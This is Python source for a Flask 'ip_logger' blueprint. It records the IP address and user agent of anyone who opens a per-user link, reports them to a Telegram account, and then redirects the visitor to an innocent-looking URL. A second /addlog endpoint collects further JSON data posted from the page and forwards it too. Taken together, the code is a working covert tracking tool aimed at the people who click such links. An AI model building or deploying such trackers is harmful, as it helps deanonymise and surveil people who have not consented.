import time

from flask import Blueprint, request, render_template, redirect

from app.logger.utilities import LoggerLog
from app.database.crud import get_user_by_address

bp = Blueprint(
    "ip_logger",
    __name__,
    template_folder="../../templates"
)

ips: dict[str, LoggerLog] = dict()


@bp.route("/<regex('^[^_]\\w+[^_]$'):path>")
def logger(path: str):
    if request.environ.get("HTTP_X_FORWARDED_FOR"):
        ip = request.environ["HTTP_X_FORWARDED_FOR"].split(",")[-1].strip()
    else:
        ip = request.environ.get("HTTP_X_REAL_IP", request.remote_addr)

    print("first: ", ip)
    print("header", request.environ.get("HTTP_X_FORWARDED_FOR"))

    if (tg_user := get_user_by_address(path)) is None:
        return "Not found", 404

    if ips.get(ip) is None:
        ips[ip] = LoggerLog(ip_address=ip, receiver_tg_id=tg_user.id, user_agent=request.user_agent.string)

    elif time.time() - ips[ip].last_response <= 60:
        return redirect(tg_user.redirect_url)
    else:
        ips[ip].last_response = time.time()
        ips[ip].receiver_tg_id = tg_user.id

    ips[ip].last_response = time.time()
    ips[ip].send_message(ips[ip].get_main_log())

    return render_template("index.html", redirect_url=tg_user.redirect_url)


@bp.route("/addlog", methods=['POST'])
def add_log():
    if request.environ.get("HTTP_X_FORWARDED_FOR"):
        ip = request.environ["HTTP_X_FORWARDED_FOR"].split(",")[-1].strip()
    else:
        ip = request.environ.get("HTTP_X_REAL_IP", request.remote_addr)
    print("second: ", ip)
    print("header", request.environ.get("HTTP_X_FORWARDED_FOR"))

    if time.time() - ips[ip].last_response >= 10:
        print("IDK WHY BRO, WHY")
        print(time.time(), ips[ip].last_response)
        return "fuck u", 403

    new_data = request.get_json()
    ips[ip].data.update(new_data)
    ips[ip].send_message(ips[ip].get_second_log())
    return "ok", 201
